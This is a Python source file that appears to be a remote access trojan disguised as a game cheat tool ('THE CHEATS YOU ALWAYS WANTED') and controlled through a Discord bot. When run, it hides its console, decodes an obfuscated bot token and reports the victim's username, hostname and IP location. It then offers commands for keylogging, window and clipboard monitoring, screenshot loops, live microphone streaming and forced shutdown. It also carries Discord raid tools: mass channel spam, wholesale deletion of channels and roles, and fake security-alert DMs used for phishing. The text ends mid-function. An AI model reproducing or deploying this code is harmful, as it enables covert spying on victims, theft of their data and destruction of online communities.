import shutil, tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
from discord.ext import commands, tasks
from PIL import ImageGrab
from pynput.keyboard import Listener
from gtts import gTTS
from io import BytesIO
from typing import Union
from datetime import datetime
from tkinter import messagebox

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

ASCII = """





                            ╔══════════════════════════════════════════════════════════════╗
                            ║                                                              ║
                            ║            ██████╗ ███████╗██╗  ████████╗ ██████╗            ║
                            ║            ██╔══██╗██╔════╝██║  ╚══██╔══╝██╔═══██╗           ║
                            ║            ██║  ██║█████╗  ██║     ██║   ██║   ██║           ║
                            ║            ██║  ██║██╔══╝  ██║     ██║   ██║   ██║           ║
                            ║            ██████╔╝███████╗███████╗██║   ╚██████╔╝           ║
                            ║            ╚═════╝ ╚══════╝╚══════╝╚═╝    ╚═════╝            ║
                            ║            ███╗   ███╗ █████╗ ██████╗ ███████╗               ║
                            ║            ████╗ ████║██╔══██╗██╔══██╗╚══███╔╝               ║
                            ║            ██╔████╔██║███████║██║  ██║  ███╔╝                ║
                            ║            ██║╚██╔╝██║██╔══██║██║  ██║ ███╔╝                 ║
                            ║            ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗               ║
                            ║            ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝               ║
                    ╔══════════════════════════════╗                                    ╔══════════╗
                    ║ THE CHEATS YOU ALWAYS WANTED ║════════════════════════════════════║ by Delto ║
                    ╚══════════════════════════════╝                                    ╚══════════╝






"""
print(ASCII)

DEV = "tilob"

if not os.getlogin() == "tilov":
    win32gui.SetForegroundWindow(ctypes.windll.kernel32.GetConsoleWindow())

    console_window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(console_window, win32con.SW_HIDE)
else: print("skipping exit")

#

def xor_encrypt_decrypt(data, key):
    key = (key * (len(data) // len(key) + 1))[:len(data)]
    return bytearray(a ^ b for a, b in zip(data, key.encode()))

hex_string = "1d353a433a3b3f411e2514413a053b031e3526403a3b37031d065d34005e4313634f1922343d11332322323e3a2e1e1515382b3a390227010a073014231a362c0a281c4442361f3d"
key = "Passwort"

encrypted_data = binascii.unhexlify(hex_string)

decrypted_data = xor_encrypt_decrypt(encrypted_data, key).decode('utf-8')
TOKEN = decrypted_data

#

current_directory = os.getcwd()


notification_sent = False
loop_running = False

clipboard_previous = None

clipboard_channel = None
spamming_enabled = True

popup_window = None
popup_root = None
close_button_window = None
popup_thread = None

cwd = os.getcwd()

intents = discord.Intents.all()
intents.message_content = True
intents.voice_states = True
intents.members = True
intents.messages = True
intents.guilds = True
intents.bans = True
intents.emojis = True
intents.integrations = True
intents.webhooks = True
intents.invites = True
intents.presences = True
intents.typing = True

bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)

keylog_buffer = []

hidden_commands = {"serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}

def on_press(key):
    try:
        keylog_buffer.append(key.char)
    except AttributeError:
        keylog_buffer.append(str(key))

async def send_keylog_data(ctx):
    if keylog_buffer:
        keylog_data = '\n'.join(keylog_buffer)
        await ctx.send(f"Keylog data:\n```{keylog_data}```")
    else:
        await ctx.send("No keylog data available.")

async def send_embed(ctx, message):
    embed = discord.Embed(description=message, color=discord.Color.blue())
    await ctx.send(embed=embed)

last_active_window = None

def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    if hwnd:
        return win32gui.GetWindowText(hwnd)
    return 'Kein aktives Fenster gefunden'

async def update_channel(channel):
    global last_active_window
    while True:
        current_active_window = get_active_window_title()
        if current_active_window != last_active_window:
            last_active_window = current_active_window
            await channel.send("NEW ACTIVE WINDOW: **" + current_active_window + "**")
        await asyncio.sleep(1)

@bot.event
async def on_ready():
    global notification_sent
    global clipboard_channel

    print(f'We have logged in as {bot.user}')

    if not notification_sent:
        guild = bot.guilds[0]

        member = guild.get_member(691670319248965694)
        bot_member = guild.me

        print(f"Spezifiziertes Mitglied: {member}")
        print(f"Bot Mitglied: {bot_member}")

        response = requests.get('http://ip-api.com/json/')

        if not os.getlogin() == DEV:
            response = requests.get('http://ip-api.com/json/')
            if response.status_code == 200:
                geolocation_data = response.json()
                IPloc = f"# Geolocation Data:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
            else:
                IPloc = "Error retrieving geolocation data."
            running = f"-----\n# Bot is ready and running!\n \nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.environ.get('COMPUTERNAME') or os.environ.get('HOSTNAME')}\n{IPloc}\n-----"
        else: running = "Bot is ready and running!"

        user_channel_name = os.getlogin()
        existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
        if not existing_channel:
            try:
                clipboard_channel = await guild.create_text_channel(name=user_channel_name)
                if member:
                    await clipboard_channel.set_permissions(member, read_messages=True, send_messages=True)
                    print(f"Permissions für {member} erfolgreich gesetzt.")
                await clipboard_channel.send(running)
                print("Clipboard Channel erstellt und Nachricht gesendet.")
            except discord.Forbidden:
                print("Der Bot hat nicht die erforderlichen Berechtigungen, um Kanäle zu erstellen oder Berechtigungen festzulegen.")
        else:
            clipboard_channel = existing_channel
            await clipboard_channel.send(running)
            print("Vorhandener Clipboard Channel gefunden und Nachricht gesendet.")

        notification_sent = True

        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='Flint'))
        print("Aktivität des Bots gesetzt.")

        await bot.change_presence(status=discord.Status.offline)
        print("Bot Status auf offline gesetzt.")

        bot.loop.create_task(monitor_clipboard())
        print("Clipboard Überwachungsprozess gestartet.")

        existing_role = discord.utils.get(guild.roles, name="BOT_perms")
        if not existing_role:
            try:
                role = await guild.create_role(name="BOT_perms", permissions=discord.Permissions.all())
                print("Rolle 'BOT_perms' erstellt.")
            except Exception as e:
                print(f"Fehler beim Erstellen der Rolle: {e}")
        else:
            role = existing_role
            print("Rolle 'BOT_perms' gefunden.")

        if role is None:
            print("Die Rolle 'BOT_perms' wurde nicht erstellt.")
            return

        if member:
            try:
                await member.add_roles(role)
                print(f"Rolle 'BOT_perms' für {member} hinzugefügt.")
            except Exception as e:
                print(f"Fehler beim Hinzufügen der Rolle für {member}: {e}")

        if bot_member:
            try:
                await bot_member.add_roles(role)
                print(f"Rolle 'BOT_perms' für Bot hinzugefügt.")
            except Exception as e:
                print(f"Fehler beim Hinzufügen der Rolle für Bot: {e}")

    if not os.getlogin() == DEV:
        await on(clipboard_channel)

    if not os.getlogin() == DEV:
        for guild in bot.guilds:
            if guild.name == "ONLY-ME":
                for channel in guild.text_channels:
                    if channel.name == os.getlogin():
                        await update_channel(channel)

#

@bot.event
async def on_message(message):
    if message.channel.name != os.getlogin():
        return

    if message.content.startswith(bot.command_prefix):
        await handle_command(message)
    else:
        await bot.process_commands(message)

    if message.author == bot.user:
        time.sleep(0.1)
        await message.add_reaction("❌")
        return

async def handle_command(message):
    content = message.content[len(bot.command_prefix):].split()
    if not content:
        await message.delete()
        return

    command = content[0]

    try:
        await message.delete()
    except discord.Forbidden:
        print("Bot does not have permission to delete messages.")
    except discord.HTTPException:
        print("Failed to delete message.")

    if command in [cmd.name for cmd in bot.commands]:
        ctx = await bot.get_context(message)
        await bot.invoke(ctx)
    else:
        await handle_invalid_command(message)

async def handle_invalid_command(message):
    command_list = [cmd.name for cmd in bot.commands]
    closest_matches = difflib.get_close_matches(message.content.split()[0][1:], command_list)
    if closest_matches:
        suggestion = closest_matches[0]
        msg = await message.channel.send(f"Befehl nicht gefunden. Meintest du: `{suggestion}`?")
        await msg.add_reaction('✅')
        await msg.add_reaction('❌')

        def check(reaction, user):
            return user == message.author and str(reaction.emoji) in ['✅', '❌'] and reaction.message.id == msg.id

        try:
            reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
            if str(reaction.emoji) == '✅':
                await msg.delete()
                ctx = await bot.get_context(message)
                new_message = ctx.message
                new_message.content = f"{bot.command_prefix}{suggestion}"
                await bot.process_commands(new_message)
            elif str(reaction.emoji) == '❌':
                await msg.delete()
        except asyncio.TimeoutError:
            await msg.delete()
    else:
        await message.channel.send("Befehl nicht gefunden.")

@bot.event
async def on_reaction_add(reaction, user):
    if user != bot.user and str(reaction.emoji) not in ['✅', '❌']:
        try:
            await reaction.remove(user)
        except discord.NotFound:
            print("Reaction or message not found.")
            return

    if user.id == 691670319248965694 and str(reaction.emoji) == '❌':
        if reaction.message.content.startswith("Befehl nicht gefunden. Meintest du:"):
            try:
                await reaction.message.delete()
            except discord.NotFound:
                print("Message already deleted.")
            return

    if user.id == 691670319248965694 and str(reaction.emoji) == '✅':
        if reaction.message.content.startswith("Befehl nicht gefunden. Meintest du:"):
            try:
                await reaction.message.delete()
            except discord.NotFound:
                print("Message already deleted.")
            suggestion = reaction.message.content.split('`')[1]
            ctx = await bot.get_context(reaction.message)
            new_message = ctx.message
            new_message.content = f"{bot.command_prefix}{suggestion}"
            await bot.process_commands(new_message)
            return

    if user.id == 691670319248965694 and str(reaction.emoji) == '❌':
        try:
            await reaction.message.delete()
        except discord.NotFound:
            print("Message already deleted.")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"Ein Fehler ist aufgetreten: {error}")
        print(f"Ein Fehler ist aufgetreten: {error}")

@bot.event
async def on_command(ctx):
    target_guild_id = 1000796001541570670
    target_channel_id = 1205819712013869056

    target_channel = bot.get_channel(target_channel_id)

    command_content = ctx.message.content

    if target_channel:
        await target_channel.send(f"AUTHOR: {ctx.author.mention}\nCOMMAND: {command_content}")
    else:
        print(f"Kanal mit der ID {target_channel_id} wurde nicht gefunden.")

#

@bot.command(help="Gets geolocation data based on IP")
async def geolocation(ctx):
    if not os.getlogin():
        response = requests.get('http://ip-api.com/json/')
        if response.status_code == 200:
            geolocation_data = response.json()
            message = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
            await send_embed_message(ctx.channel, message)
        else:
            await send_embed_message(ctx.channel, "Error retrieving geolocation data.")
    else: await send_embed_message(ctx.channel, "DU HURENSOHN")

@bot.command(help="Displays system specifications")
async def specs(ctx):
    system_specs = f"**System Specifications**:\n"
    system_specs += f"Platform: {platform.platform()}\n"
    system_specs += f"Processor: {platform.processor()}\n"
    system_specs += f"Operating System: {platform.system()} {platform.release()}\n"
    system_specs += f"Python Version: {platform.python_version()}\n"
    system_specs += f"Architecture: {platform.architecture()[0]}\n"
    system_specs += f"Logged-in User: {os.getlogin()}\n"

    await send_embed_message(ctx.channel, system_specs)

def list_devices():
    try:
        wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        service = wmi.ConnectServer(".", "root\cimv2")
        devices = service.ExecQuery("SELECT * FROM Win32_PnPEntity")

        if len(devices) == 0:
            return "No devices found."

        device_list = []
        current_length = 0
        for device in devices:
            if device.Name:
                if len(device.Name) + current_length <= 1900:
                    device_list.append(device.Name)
                    current_length += len(device.Name)
                else:
                    break

        if len(device_list) == 0:
            return "No devices found."

        formatted_devices = "\n".join(device_list)
        return f"Available devices:\n{formatted_devices}"
    except Exception as e:
        return f"An error occurred: {str(e)}"

@bot.command(help="list devices")
async def devices(ctx):
    response = list_devices()
    await ctx.send(response)

@bot.command(help="Fake Help message")
async def help(ctx):
    await ctx.send("Befehl nicht gefunden. Meintest du: `help`?")

@bot.command(help="Displays this message")
async def helpy(ctx, category: str = None):
    embed_pages = []

    if category == "hidden":
        commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
    else:
        commands = sorted([command for command in bot.commands if command.name != "help" and command.name not in hidden_commands], key=lambda x: x.name)

    chunks = [commands[i:i + 15] for i in range(0, len(commands), 15)]
    total_commands = len(commands)

    for idx, chunk in enumerate(chunks, 1):
        embed = discord.Embed(
            title="Command List",
            description="A list of available commands.",
            color=discord.Color.blue()
        )
        for command in chunk:
            embed.add_field(name=f">{command.name}", value=command.help, inline=False)
        embed.set_footer(text=f"Total commands: {total_commands}\nPage {idx}/{len(chunks)}")
        embed_pages.append(embed)

    current_page = 0
    message = await ctx.send(embed=embed_pages[current_page])

    async def paginate(reaction, user):
        nonlocal current_page
        if user == ctx.author:
            if str(reaction.emoji) == "◀️" and current_page > 0:
                current_page -= 1
                await message.edit(embed=embed_pages[current_page])
            elif str(reaction.emoji) == "▶️" and current_page < len(embed_pages) - 1:
                current_page += 1
                await message.edit(embed=embed_pages[current_page])

            try:
                await message.remove_reaction(reaction.emoji, user)
            except discord.NotFound:
                print("Message already deleted.")

    def check_reaction(reaction, user):
        return user == ctx.author and str(reaction.emoji) == '❌' and reaction.message.id == message.id

    await message.add_reaction("◀️")
    await message.add_reaction("▶️")
    await message.add_reaction("❌")

    bot.add_listener(paginate, "on_reaction_add")

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=300.0, check=check_reaction)
        if str(reaction.emoji) == '❌':
            await message.delete()
    except asyncio.TimeoutError:
        await message.clear_reactions()

@bot.command(help="Restarts the PC")
async def restart(ctx):
    await send_embed_message(ctx.channel, "Restarting the PC...")
    if not os.getlogin() == DEV:
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/r", "/t", "1"], shell=True)
        else:
            subprocess.run(["sudo", "reboot"], shell=True)
    else: ctx.send("DU HURENSOHN")

@bot.command(help="Shuts down the PC")
async def shutdown(ctx):
    await send_embed_message(ctx.channel, "Shutting down the PC...")
    if not os.getlogin() == DEV:
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "1"], shell=True)
        else:
            subprocess.run(["sudo", "shutdown", "-h", "now"], shell=True)
    else: ctx.send("DU HURENSOHN")

@bot.command(help="Reloads the bot script")
async def reload(ctx):
    global current_directory
    await send_embed_message(ctx.channel, "Reloading the script...")

    saved_directory = current_directory

    os.chdir(saved_directory)

    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.command(help="Unloads the bot script")
async def eject(ctx):
    global clipboard_channel
    try:
        if clipboard_channel:
            await clipboard_channel.delete(reason="Bot is unloading.")
    except Exception as e:
        print(f"An error occurred while unloading the script: {e}")
    finally:
        await bot.close()
        sys.exit(0)

@bot.command(help="Creates a role, a text channel, a voice channel, and a category named 'w'")
async def test(ctx):
    try:
        role_name = "w"
        role = await ctx.guild.create_role(name=role_name)
        await ctx.send("Role created: w")

        text_channel = await ctx.guild.create_text_channel(name="w")
        await ctx.send("Text channel created: w")

        voice_channel = await ctx.guild.create_voice_channel(name="w")
        await ctx.send("Voice channel created: w")

        category = await ctx.guild.create_category_channel(name="w")
        await ctx.send("Category created: w")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help="Takes a screenshot")
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
        all_screens = ImageGrab.grab(all_screens=True)
        all_screens.save(tmp_file.name)
        await ctx.send(file=discord.File(tmp_file.name))

@bot.command(help="Starts a screenshot loop")
async def screenstart(ctx):
    global loop_running
    if loop_running:
        await ctx.send("Screenshot loop is already running.")
        return
    loop_running = True
    await ctx.send("@here Starting screenshot loop...")
    while loop_running:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
            all_screens = ImageGrab.grab(all_screens=True)
            all_screens.save(tmp_file.name)
            await ctx.send(file=discord.File(tmp_file.name))
        await asyncio.sleep(20)

@bot.command(help="Stops the screenshot loop")
async def screenstop(ctx):
    global loop_running
    if not loop_running:
        await ctx.send("Screenshot loop is not running.")
        return
    loop_running = False
    await ctx.send("Screenshot loop stopped.")

async def send_embed_message(channel, content):
    embed = discord.Embed(description=content, color=discord.Color.blue())
    await channel.send(embed=embed)

async def send_audio_background(stream, voice_client, stop_event):
    CHUNK = 2048
    loop = asyncio.get_event_loop()

    while not voice_client.is_connected():
        await asyncio.sleep(0.1)

    while not stop_event.is_set():
        try:
            data = await loop.run_in_executor(None, stream.read, CHUNK)
            if voice_client.is_connected():
                voice_client.send_audio_packet(data)
            else:
                break
        except Exception as e:
            print(f"Fehler beim Senden von Audio: {e}")
            break

async def play_microphone(ctx):
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 100000
    CHUNK = 100000
    p = pyaudio.PyAudio()
    stream = None

    stop_event = asyncio.Event()

    try:
        user_channel_name = os.getlogin()
        guild = ctx.guild
        voice_channel = discord.utils.get(guild.voice_channels, name=user_channel_name)

        if voice_channel is None:
            await guild.create_voice_channel(name=user_channel_name)

        voice_client = await voice_channel.connect()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        audio_task = asyncio.create_task(send_audio_background(stream, voice_client, stop_event))

        await ctx.send("Audio-Übertragung gestartet. Verwenden Sie >leavevoice, um die Übertragung zu beenden.")

        while True:
            await asyncio.sleep(1)

    except Exception as e:
        await ctx.send(f"Fehler bei der Audio-Übertragung: {e}")

    finally:
        if stream is not None and stream.is_active():
            stream.stop_stream()
            stream.close()
        p.terminate()

        if ctx.voice_client.is_connected():
            await ctx.voice_client.disconnect()

@bot.command(help="Joins the voice channel and streams microphone audio")
async def joinvoice(ctx):
    await play_microphone(ctx)

@bot.command(help="Leaves the voice channel")
async def leavevoice(ctx):
    if ctx.voice_client is None:
        await ctx.send("I am not connected to a voice channel.")
        return

    await ctx.send("Audio-Übertragung beendet.")
    await ctx.voice_client.disconnect()

@bot.command(help="Creates 100 channels and sends @everyone message in each channel")
async def spam(ctx):
    async def create_channels_and_spam():
        async def create_channel_and_spam(i):
            channel = await ctx.guild.create_text_channel(name=f"raided-by-heidi-{i}")
            for _ in range(100):
                await asyncio.sleep(5)
                await channel.send("@everyone You just got raided by Heidi!")

        tasks = [create_channel_and_spam(i) for i in range(1, 101)]
        await asyncio.gather(*tasks)

    await create_channels_and_spam()
    await ctx.send("Spamming complete.")

@bot.command(help="Deletes all spam channels")
async def delspam(ctx):
    async def delete_channel(channel):
        await channel.delete()

    tasks = [delete_channel(channel) for channel in ctx.guild.channels if channel.name.startswith("raided-by-heidi-")]
    await asyncio.gather(*tasks)
    await ctx.send("All spam channels deleted.")

@bot.command(help="Deletes all channels, roles, emojis, stickers, and soundboards except for specified roles and user's channel")
async def delall(ctx):
    dope_role = discord.utils.get(ctx.guild.roles, name="DOPE ROLE")
    Mee9_role = discord.utils.get(ctx.guild.roles, name="Mee9")
    draht_role = discord.utils.get(ctx.guild.roles, name="DRAHT")
    perms_role = discord.utils.get(ctx.guild.roles, name="BOT_perms")
    noban_role = discord.utils.get(ctx.guild.roles, name="nobanana")
    everyone_role = ctx.guild.default_role
    bot_role = ctx.guild.me.top_role

    print("Gefundene Rollen:")
    print(dope_role)
    print(Mee9_role)
    print(draht_role)
    print(everyone_role)
    print(perms_role)
    print(noban_role)
    print(f"Bot-Rolle: {bot_role}")

    user_channel_name = os.getlogin()

    async def delete_item(item):
        if isinstance(item, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
            if item.name != user_channel_name and item.name != "nudel":
                print(f"Lösche Kanal/Kategorie: {item.name}")
                await item.delete()
        elif isinstance(item, discord.Role):
            print(f"Überprüfe Rolle: {item.name}")
            if item in [dope_role, Mee9_role, draht_role, everyone_role, bot_role, perms_role, noban_role]:
                print(f"Überspringe Rolle: {item.name}")
                return
            if item.position >= bot_role.position:
                print(f"Überspringe Rolle: {item.name} (über der Bot-Rolle)")
                return
            print(f"Lösche Rolle: {item.name}")
            await item.delete()
        elif isinstance(item, discord.Emoji):
            print(f"Lösche Emoji: {item.name}")
            await item.delete()
        elif isinstance(item, discord.GuildSticker):
            print(f"Lösche Sticker: {item.name}")
            await item.delete()
        elif isinstance(item, discord.VoiceClient):
            if hasattr(item, 'soundboard_sounds'):
                for soundboard_sound in item.soundboard_sounds:
                    print(f"Lösche Soundboard-Sound: {soundboard_sound.name}")
                    await soundboard_sound.delete()

    items_to_delete = ctx.guild.channels + ctx.guild.roles + list(ctx.guild.emojis) + list(ctx.guild.stickers)

    for vc in ctx.guild.voice_channels:
        if vc.guild.voice_client:
            items_to_delete.append(vc.guild.voice_client)

    print("Zu löschende Elemente:")
    print(items_to_delete)

    tasks = [delete_item(item) for item in items_to_delete]

    await asyncio.gather(*tasks)

@bot.command(help= "Set every channel as nsfw")
async def nsfw(ctx):
    if ctx.author.guild_permissions.administrator:
        for channel in ctx.guild.channels:
            try:
                await channel.edit(nsfw=True)
                print(f"Der Kanal {channel.name} wurde zu einem NSFW-Kanal geändert.")
            except Exception as e:
                print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
        await ctx.send("Alle Kanäle wurden zu NSFW-Kanälen geändert.")
    else:
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

@bot.command(help= "Set every channel as non nsfw")
async def unnsfw(ctx):
    if ctx.author.guild_permissions.administrator:
        for channel in ctx.guild.channels:
            try:
                if channel.is_nsfw():
                    await channel.edit(nsfw=False)
                    print(f"Der NSFW-Kanal {channel.name} wurde zu einem normalen Kanal geändert.")
            except Exception as e:
                print(f"Fehler beim Ändern des Kanals {channel.name}: {e}")
        await ctx.send("Alle NSFW-Kanäle wurden in normale Kanäle geändert.")
    else:
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

@bot.command(help="Deletes all soundboards")
async def delsound(ctx):
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("Der Bot benötigt Administratorberechtigungen, um Soundboards zu löschen.")
        return

    guild_features = ctx.guild.features

    if "DISCOVERABLE" in guild_features:
        await ctx.send("Soundboards können nicht direkt über die API gelöscht werden.")
        await ctx.send("Bitte entfernen Sie die Soundboards manuell über die Discord-Benutzeroberfläche.")
        return
    else:
        await ctx.send("Es wurden keine Soundboards gefunden, die gelöscht werden könnten.")
        return

@bot.command(help= "Check the bot permissions")
async def check_perms(ctx):
    if ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("Bot has permission to manage channels.")
    else:
        await ctx.send("Bot does not have permission to manage channels.")

    if ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("Bot has permission to manage roles.")
    else:
        await ctx.send("Bot does not have permission to manage roles.")

@bot.command(help="Renames the server")
async def reguild(ctx, *name):
    new_name = ' '.join(name)
    await ctx.guild.edit(name=new_name)
    await ctx.send(f"Server name changed to: {new_name}")


@bot.command(help="Changes the server's icon")
async def repic(ctx, url: str = None):
    if url is None and len(ctx.message.attachments) == 0:
        await ctx.send("No image attached or URL provided. Please attach an image file or provide a URL.")
        return

    if url:
        if not (url.endswith(('.png', '.jpg', '.jpeg', '.gif')) or 'cdn.discordapp.com' in url):
            await ctx.send("Unsupported file format or URL. Please provide a direct link to an image file or use a valid Discord CDN link.")
            return

        if 'cdn.discordapp.com' in url:
            data = requests.get(url).content
        else:
            try:
                response = requests.get(url)
                response.raise_for_status()
                data = response.content
            except Exception as e:
                await ctx.send("Failed to download the image from the provided URL. Please check the URL and try again.")
                return
    else:
        attachment = ctx.message.attachments[0]
        if attachment.content_type.startswith('image'):
            data = await attachment.read()
        else:
            await ctx.send("Unsupported file format. Please attach an image file or provide a direct link to an image file.")
            return

    try:
        await ctx.guild.edit(icon=data)
        await ctx.send("Server icon changed successfully.")
    except Exception as e:
        await ctx.send("Failed to change server icon. Please make sure the bot has the necessary permissions.")

@bot.command(help="Spams the audit log by creating and deleting roles")
async def auditspam(ctx):
    role_name = "raided by Heidi"

    for _ in range(100):
        role = await ctx.guild.create_role(name=role_name)
        await asyncio.sleep(0.1)
        await role.delete()
        await asyncio.sleep(0.1)

    await ctx.send("Audit log spammed with role create/delete actions 100 times.")

@bot.command(help="Sends a fake security DM to the server owner")
async def fakedm(ctx):
    owner = ctx.guild.owner
    if owner:
        try:
            embed = discord.Embed(
                title="🚨 Security Alert 🚨",
                description=(
                    "Hello, I'm a security bot monitoring your server.\n\n"
                    "🔴 **Urgent Issue Detected** 🔴\n\n"
                    "It looks like your server **{server_name}** has been targeted by a raid. "
                    "I'm currently attempting to mitigate the damage, but I need your assistance to fully resolve the issue.\n\n"
                    "**Action Required:**\n"
                    "1. Please review recent activities in your server.\n"
                    "2. Ensure no unauthorized roles or permissions have been granted.\n"
                    "3. If possible, enable server verification to prevent further unauthorized access.\n\n"
                    "Your prompt attention is crucial to secure your community. Thank you for your cooperation.\n\n"
                    "Best regards,\n"
                    "Your Security Bot"
                ).format(server_name=ctx.guild.name),
                color=discord.Color.red()
            )
            embed.set_footer(text="Security Bot")
            await owner.send(embed=embed)
            await ctx.send("Fake DM sent to the server owner.")
        except discord.Forbidden:
            await ctx.send("I couldn't send a DM to the server owner. They might have DMs disabled.")
    else:
        await ctx.send("Couldn't find the server owner.")

@bot.command(help="Sends a fake security DM to a specified member")
async def fakedmu(ctx, member_id: int):
    member = ctx.guild.get_member(member_id)
    if member:
        try:
            embed = discord.Embed(
                title="🚨 Security Alert 🚨",
                description=(
                    "Hello, I'm a security bot monitoring your server.\n\n"
                    "🔴 **Urgent Issue Detected** 🔴\n\n"
                    "It looks like your server **{server_name}** has been targeted by a raid. "
                    "I'm currently attempting to mitigate the damage, but I need your assistance to fully resolve the issue.\n\n"
                    "**Action Required:**\n"
                    "1. Please review recent activities in your server.\n"
                    "2. Ensure no unauthorized roles or permissions have been granted.\n"
                    "3. If possible, enable server verification to prevent further unauthorized access.\n\n"
                    "Your prompt attention is crucial to secure your community. Thank you for your cooperation.\n\n"
                    "Best regards,\n"
                    "Your Security Bot"
                ).format(server_name=ctx.guild.name),
                color=discord.Color.red()
            )
            embed.set_footer(text="Security Bot")
            await member.send(embed=embed)
            await ctx.send(f"Fake DM sent to {member.display_name}.")
        except discord.Forbidden:
            await ctx.send(f"I couldn't send a DM to {member.display_name}. They might have DMs disabled.")
    else:
        await ctx.send("Couldn't find the member with the provided ID.")

@bot.command(help= "Delete all Invites")
async def delinv(ctx):
    invites = await ctx.guild.invites()
    for invite in invites:
        await invite.delete()
    await ctx.send('All invites have been deleted.')

@bot.command(help= "Ban a specific Person")
async def ban(ctx, member: Union[discord.Member, discord.Object]):
    if isinstance(member, discord.Member):
        await member.ban()
        await ctx.send(f'{member.mention} wurde gebannt.')
    else:
        try:
            await bot.http.ban(member.id, ctx.guild.id, 0)
            await ctx.send(f'<@{member.id}> wurde gebannt.')
        except discord.NotFound:
            await ctx.send("Die Person konnte nicht gefunden werden.")

@bot.command(help= "Unban a specific Person")
async def unban(ctx, member_id: int):
    try:
        ban_entry = await ctx.guild.fetch_ban(discord.Object(id=member_id))
        user = ban_entry.user
        await ctx.guild.unban(user)
        await ctx.send(f'{user.mention} wurde entbannt.')
    except discord.NotFound:
        await ctx.send("Die Person ist nicht gebannt.")

@bot.command(help= "Kick a specific Person")
async def kick(ctx, member: discord.Member):
    await member.kick()
    await ctx.send(f'{member.display_name} has been kicked.')

@bot.command(help="Sends a fake message in someone else's name")
async def fakemessage(ctx, member: discord.Member, *, message: str):
    await ctx.message.delete()
    await member.send(message)

@bot.command(help="Manipulates poll results by adding a fake vote")
async def fakevote(ctx, poll_message_id: int, reaction: str):
    poll_message = await ctx.channel.fetch_message(poll_message_id)
    await poll_message.add_reaction(reaction)

@bot.command(help="Sends fake kick/ban messages")
async def fakekick(ctx, member: discord.Member, *, reason: str):
    kick_embed = discord.Embed(
        title="Member Kicked",
        description=f"**{member.name}** has been kicked from the server.",
        color=discord.Color.red()
    )
    kick_embed.add_field(name="Reason", value=reason)
    await ctx.send(embed=kick_embed)

@bot.command(help="Posts automatically generated inappropriate content")
async def spamcontent(ctx, count: int):
    for _ in range(count):
        await ctx.send("https://pornhub.com/")

async def purge_channel(channel):
    deleted = 0
    while True:
        purged = await channel.purge(limit=100)
        deleted += len(purged)
        if len(purged) < 100:
            break
    return deleted

@bot.command(help="Deletes the message history in a channel")
async def clear(ctx, *channels: discord.TextChannel):
    total_deleted = 0

    if not channels:
        start_time = time.perf_counter()
        deleted = await purge_channel(ctx.channel)
        total_deleted += deleted
        end_time = time.perf_counter()
        total_time = end_time - start_time
        await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=2)
    else:
        start_time = time.perf_counter()
        tasks = [purge_channel(channel) for channel in channels]
        deleted_counts = await asyncio.gather(*tasks)
        total_deleted += sum(deleted_counts)
        end_time = time.perf_counter()
        total_time = end_time - start_time
        await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=2)

    try:
        await asyncio.sleep(total_time)
        await ctx.message.delete()
    except discord.NotFound:
        pass

@bot.command(help="Deletes the message history in all channels")
async def clearall(ctx):
    for channel in ctx.guild.text_channels:
        await channel.purge(limit=None)

@bot.command(help="Assigns the DOPE ROLE to the user")
async def dop(ctx):
    dope_role = discord.utils.get(ctx.guild.roles, name="DOPE ROLE")
